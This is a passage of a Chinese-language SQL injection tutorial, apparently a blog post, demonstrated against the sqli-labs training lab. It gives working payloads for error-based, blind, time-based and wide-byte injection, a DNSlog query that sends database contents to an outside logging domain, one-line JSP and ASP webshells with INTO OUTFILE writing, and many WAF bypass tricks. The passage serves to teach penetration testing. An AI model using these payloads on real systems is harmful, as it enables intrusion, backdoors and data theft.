sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,flag,3 from flag %23</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h4><p>通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。<br>1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277\" alt=\"image.png\"><br>2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277\" alt=\"image.png\"><br>3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277\" alt=\"image.png\"><br>4、使用报错函数updataxml()查询当前数据库库名。payload如下：<br>?id=1 and updatexml(1,concat(0x7e,(select database())),1)<br>这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277\" alt=\"image.png\"><br>5、获取flag表中的数据。<br><a href=\"http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1\">http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1</a> and updatexml(1,concat(0x7e,(select flag from flag)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277\" alt=\"image.png\"><br>6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。<br>获取第一个字符开始的20个数据：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277\" alt=\"image.png\"><br>获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h3 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h3><p>对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。</p>\n<h4 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h4><p>布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：<br>1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277\" alt=\"image.png\"><br>2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过length()函数判断数据库库名的长度大于1。<br>?id=1’ and length(database())&gt;1 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277\" alt=\"image.png\"><br>5、在大于8的时候页面返回空，所以数据库库名长度等于8。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277\" alt=\"image.png\"><br>6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码<br>?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23<br>?id=1’ and ascii(substr((select database()),1,1))=101 %23<br>首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277\" alt=\"image.png\"><br>7、更改截取的位置，判断后面的字符对应的ascii码值。<br>?id=1’ and ascii(substr((select database()),2,1))=101 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h4><p>延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。<br>1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554\" alt=\"image.png\"><br>2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。<br>?id=2’ and if((length(database())=8),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277\" alt=\"image.png\"><br>4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。<br>?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277\" alt=\"image.png\"><br>5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533\" alt=\"image.png\"></p>\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入’（单引号）或者”（双引号）进行闭合的时候，程序会自动在前面加上\\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。<br>在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。</p>\n<h4 id=\"宽字节注入具体解析过程\"><a href=\"#宽字节注入具体解析过程\" class=\"headerlink\" title=\"宽字节注入具体解析过程:\"></a>宽字节注入具体解析过程:</h4><p>1、在id传参后面加上%df和单引号<br>2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\\’，即?id=1%df\\’ and 1=1 %23<br>url编码为：?id=1%df%5C%27%20and%201%3D1%20%23<br>3、PHP将处理好的数据带入mysql处理时使用了gbk编码<br>4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\\（反斜线）<br>5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合</p>\n<h4 id=\"实例演示：\"><a href=\"#实例演示：\" class=\"headerlink\" title=\"实例演示：\"></a>实例演示：</h4><p>1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277\" alt=\"image.png\"><br>2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277\" alt=\"image.png\"><br>3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过union select 判断出注入点为2和3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277\" alt=\"image.png\"><br>5、通过注入点3获取flag数据表中的flag字段的数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"巧用dnslog进行SQL注入\"><a href=\"#巧用dnslog进行SQL注入\" class=\"headerlink\" title=\"巧用dnslog进行SQL注入\"></a>巧用dnslog进行SQL注入</h2><p>前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。</p>\n<h3 id=\"Dnslog\"><a href=\"#Dnslog\" class=\"headerlink\" title=\"Dnslog\"></a>Dnslog</h3><p>dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。</p>\n<h3 id=\"Load-file-函数\"><a href=\"#Load-file-函数\" class=\"headerlink\" title=\"Load_file()函数\"></a>Load_file()函数</h3><p>数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：<br>1.文件在服务器上<br>2.指定完整路径的文件<br>3.必须有FILE权限</p>\n<h3 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h3><p>UNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。</p>\n<h3 id=\"Dnslog注入实例演示\"><a href=\"#Dnslog注入实例演示\" class=\"headerlink\" title=\"Dnslog注入实例演示\"></a>Dnslog注入实例演示</h3><p>1、打开实例站点，很明显这里是只能使用盲注的站点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277\" alt=\"image.png\"><br>2、通过order by判断出字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277\" alt=\"image.png\"><br>3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：<br>?id=1 ‘ union select 1,2,load_file(concat(‘//‘,(select database()),’.pcijrt.dnslog.cn<br>/abc’)) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277\" alt=\"image.png\"><br>5、执行语句之后在dnslog日志中获取到数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277\" alt=\"image.png\"><br>6、修改子查询里的内容，获取其他数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"SQL注入写入webshell\"><a href=\"#SQL注入写入webshell\" class=\"headerlink\" title=\"SQL注入写入webshell\"></a>SQL注入写入webshell</h2><h3 id=\"Webshell\"><a href=\"#Webshell\" class=\"headerlink\" title=\"Webshell\"></a>Webshell</h3><p>Webshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：<br><strong>jsp</strong><br>&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;<br><strong>asp</strong><br>success!!!!&lt;%eval request(“cmd”)%&gt;<br><strong>php</strong></p>\n<h3 id=\"out-file-amp-dump-file\"><a href=\"#out-file-amp-dump-file\" class=\"headerlink\" title=\"out_file&amp;dump_file\"></a>out_file&amp;dump_file</h3><p>在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。<br>通过sql注入写webshell的具体用法：<br>select  into outfile ‘C:/phpStudy/WWW/1.php’<br>select  into dumpfile ‘C:/phpStudy/WWW/1.php’<br>二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。</p>\n<h2 id=\"SQL注入如何绕过waf\"><a href=\"#SQL注入如何绕过waf\" class=\"headerlink\" title=\"SQL注入如何绕过waf\"></a>SQL注入如何绕过waf</h2><p>在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:<br>If(xxx){<br>拦截！<br>}else{<br>通过<br>}<br>所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：</p>\n<h4 id=\"1、大小写绕过\"><a href=\"#1、大小写绕过\" class=\"headerlink\" title=\"1、大小写绕过\"></a>1、大小写绕过</h4><p>?id=1 and UnIoN sElEcT 1,2,3<br>?id=1 OrDeR By 1</p>\n<h4 id=\"2、双写绕过\"><a href=\"#2、双写绕过\" class=\"headerlink\" title=\"2、双写绕过\"></a>2、双写绕过</h4><p>一些防护措施只进行一次，可以通过双写关键字的方法绕过。<br>Id=1 ununionion selselectect 1,2,3 删除一次–&gt; union select<br>Id=1 ororderder bbyy    1    删除一次–&gt; order by</p>\n<h4 id=\"3、编码绕过\"><a href=\"#3、编码绕过\" class=\"headerlink\" title=\"3、编码绕过\"></a>3、编码绕过</h4><p>如果检测的是关键字，那么经过编码即可绕过<br>URL全编码：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277\" alt=\"image.png\"><br>十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"4、基本符号替换\"><a href=\"#4、基本符号替换\" class=\"headerlink\" title=\"4、基本符号替换\"></a>4、基本符号替换</h4><p>用&amp;&amp;替换and<br>用||替换or<br>用/**/替换空格<br>URL栏中用+替换空格</p>\n<h4 id=\"5、报错注入替换函数绕过\"><a href=\"#5、报错注入替换函数绕过\" class=\"headerlink\" title=\"5、报错注入替换函数绕过\"></a>5、报错注入替换函数绕过</h4><p>有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：<br>1.floor()<br>id = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)<br>2. extractvalue()<br>id = 1 and (extractvalue(1, concat(0x5c,(select user()))))<br>id = 1 and extractvalue(1,concat(char(126),database()))<br>3. updatexml()<br>id = 1 and (updatexml(0x3a,concat(1,(select user())),1))</p>\n<p>4.exp()<br>exp(~(select * from(select user()))a))</p>\n<p>5.GeometryCollection()<br>Id=1 and GeometryCollection((select _ from(select _ from(select user())a)b))</p>\n<p>6.Polygon</p>\n<p>Id = 1 and polygon((select _ from (select _ from(select user())a)b))</p>\n<p>7.Multipoint()</p>\n<p>Id = 1 and Multipoint ((select _ from (select _ from(select user())a)b))</p>\n<p>8.Multilinestring()</p>\n<p>Id = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))</p>\n<p>9.multipolygon</p>\n<p>Id = 1 and multipolygon ((select _ from (select _ from(select user())a)b))</p>\n<p>10.linestring()</p>\n<p>Id = 1 and linestring ((select _ from (select _ from(select user())a)b))</p>\n<h4 id=\"6、其他等价函数绕过\"><a href=\"#6、其他等价函数绕过\" class=\"headerlink\" title=\"6、其他等价函数绕过\"></a>6、其他等价函数绕过</h4><p>hex()、bin() ==&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@<a href=\"/user\">@user </a> ==&gt; user()<br>@<a href=\"/database\">@database </a> ==&gt; database() </p>\n<h4 id=\"7、内联注释配合注释绕过\"><a href=\"#7、内联注释配合注释绕过\" class=\"headerlink\" title=\"7、内联注释配合注释绕过\"></a>7、内联注释配合注释绕过</h4><p>Id=1/**//<em>! order</em>/+/<em>!by</em>/+1</p>\n<h4 id=\"8、-0a换行跳出单行注释绕过\"><a href=\"#8、-0a换行跳出单行注释绕过\" class=\"headerlink\" title=\"8、%0a换行跳出单行注释绕过\"></a>8、%0a换行跳出单行注释绕过</h4><p>原理：数据库中对于#和–（空格）后面的东西都进行注释忽略处理<br>我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。<br>Payload：<br>id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201<br>id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3</p>\n<h4 id=\"9、利用一些中间件的缺陷\"><a href=\"#9、利用一些中间件的缺陷\" class=\"headerlink\" title=\"9、利用一些中间件的缺陷\"></a>9、利用一些中间件的缺陷</h4><p>（1）IIS+ASP<br>通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min<br>（2）IIS的Unicode编码<br>IIS支持Unicode编码，可以通过编码关键词进行绕过：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277\" alt=\"image.png\"><br>（3）HTTP参数污染<br>有的时候，浏览器对于这样的传参会出现以下情况：<br>Id=1 and id=2 –&gt; 出现在服务器中，id=1,2<br>那么我们可以这样绕：<br>id=1 and union select username &amp; id= password form admin<br>–&gt; id=1 and union select username, password form admin</p>\n<p>对于这种参数重复传参的情况，不同环境有不同结果：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"10、更换传参方式绕过\"><a href=\"#10、更换传参方式绕过\" class=\"headerlink\" title=\"10、更换传参方式绕过\"></a>10、更换传参方式绕过</h4><p>在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"11、利用数据提取方式的缺陷进行绕过\"><a href=\"#11、利用数据提取方式的缺陷进行绕过\" class=\"headerlink\" title=\"11、利用数据提取方式的缺陷进行绕过\"></a>11、利用数据提取方式的缺陷进行绕过</h4><p>Example：<br>在PHP+Apache中<br>x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：<br>x=1<br>y=2<br>z=3<br>payload:<br>id=1+union+/<em>&amp;x=2</em>/+select/<em>&amp;y=3</em>/+1,2,3+from+admin<br>waf检测方式为分别检测三个传参：<br>id=1+union+/*<br>x=2_/+select/_<br>y=3*/1,2,3+from+admin</p>\n<p>数据库中，/**/中间的东西被过滤了，获得的传参为：<br>id=1+union+select+1,2,3+from+admin</p>\n<h4 id=\"12、脏数据绕过\"><a href=\"#12、脏数据绕过\" class=\"headerlink\" title=\"12、脏数据绕过\"></a>12、脏数据绕过</h4><p>在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277\" alt=\"image.png\"><br>下面给出生成垃圾数据的脚本：<br>#coding=utf-8<br>import random,string<br>from urllib import parse<br>code by yzddMr6</p>\n<p>varname_min = 5<br>varname_max = 15<br>data_min = 20<br>data_max = 25<br>num_min = 50<br>num_max = 100<br>def 